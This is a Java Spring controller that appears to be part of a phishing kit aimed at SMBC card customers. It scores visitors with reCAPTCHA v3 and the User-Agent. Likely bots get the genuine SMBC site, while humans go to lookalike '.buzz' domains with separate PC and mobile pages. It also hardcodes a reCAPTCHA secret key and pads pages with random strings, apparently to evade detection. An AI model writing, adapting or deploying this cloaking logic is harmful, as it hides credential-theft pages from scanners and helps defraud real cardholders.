package com.kidd.redirect.controller;

import cn.hutool.core.util.RandomUtil;
import cn.hutool.http.Header;
import cn.hutool.http.HttpRequest;
import cn.hutool.http.useragent.UserAgent;
import cn.hutool.http.useragent.UserAgentUtil;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;

import java.math.BigDecimal;
import java.util.HashMap;
import java.util.Map;


@Controller
public class RedirectController {

    @Value("${google.secret:6Lcsyy0aAAAAAO6HCHjPOEdiKmN3OFx53r14twie}")
    private String googleSecret;

    @Value("${smbc.defaulRedirectUrl:https://www.smbc-card.com/sp/index.jsp}")
    private String defaulRedirectUrl;

    @Value("${smbc.pcRedirectUrl:https://www2.smbc-card.com.t3nec30hl9gmzfmxttmhk7yqzuge4a.buzz/pc/index}")
    private String pcRedirectUrl;

    @Value("${smbc.appRedirectUrl:https://www2.smbc-card.com.t3nec30hl9gmzfmxttmhk7yqzuge4a.buzz/mobile/index}")
    private String appRedirectUrl;

    private void randStr(Model model) {
        String random = RandomUtil.randomString(3000);
        String header = RandomUtil.randomString(20);
        model.addAttribute("data", random);
        model.addAttribute("header", header);
    }

    /**
     * 判定是pc端or手机端
     *
     * @param model
     * @return
     */
    @GetMapping("/index")
    public Object index(@RequestHeader("User-Agent") String uaStr, Model model) {
        return "index";
    }

    @RequestMapping("/checkBot")
    @ResponseBody
    public Object checkBotAndRedirect(@RequestHeader("User-Agent") String uaStr, @RequestParam("response") String response) {
        String googleUrl = "https://www.recaptcha.net/recaptcha/api/siteverify";
        String redirectUrl = defaulRedirectUrl;
        Map<String, Object> postParam = new HashMap<>();
        postParam.put("secret", googleSecret);
        postParam.put("response", response);
        //判定爬虫
        try {
            String result = HttpRequest.post(googleUrl)
                    .form(postParam)
                    .header(Header.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36")//头信息，多个头信息多次调用此方法即可
                    .timeout(5000)//超时，毫秒
                    .execute()
                    .body();
            JSONObject jsonResult = JSON.parseObject(result);
            if (null != jsonResult && jsonResult.containsKey("score")) {
                BigDecimal score = ((BigDecimal) jsonResult.get("score"));
                if (score.doubleValue() > 0.5) {
                    Boolean isMobile = false;
                    UserAgent ua = UserAgentUtil.parse(uaStr);
                    isMobile = ua.isMobile();
                    redirectUrl = (isMobile ? appRedirectUrl : pcRedirectUrl);
                }
            }
        } catch (Exception e) {
            System.out.println("checkBotAndRedirect error:"+e.getMessage());
            redirectUrl = appRedirectUrl;
        }
        return redirectUrl;
    }
}
